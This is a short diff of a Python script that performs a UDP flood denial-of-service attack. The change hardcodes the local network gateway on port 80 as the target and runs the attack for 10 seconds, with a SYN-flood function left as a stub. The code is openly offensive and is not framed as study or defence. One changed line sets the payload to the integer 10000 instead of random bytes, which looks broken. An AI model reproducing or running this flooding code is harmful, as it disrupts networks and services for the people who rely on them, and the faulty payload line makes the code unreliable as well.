@@ -8,7 +8,10 @@ import socket
 import time
 
 #Denial of service attack
-def DOS(IP, port, times):
+def DOS():
+    IP = getGateway()
+    times = 10
+    port = 80
     if platform.system()[:3].lower()=="win":
 	#Windows command prompt uses cls to clear the screen
         os.system("cls")
@@ -18,7 +21,7 @@ def DOS(IP, port, times):
 #Opening a socket on IPv4(socket.AF_INET) and using UDP(socket.SOCK_DGRAM)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 #Pick a random value
-    bytes = random._urandom(1024)
+    bytes = 10000
 #Timeout for that value
     timeoutValue = time.time() + times
 
@@ -56,4 +59,4 @@ def synFlood(IP, port, numPackets): #implement later
 
 # print(getGateway())
 # pingDataOverload(getGateway())
-DOS(getGateway(), 80, 900)
+DOS()
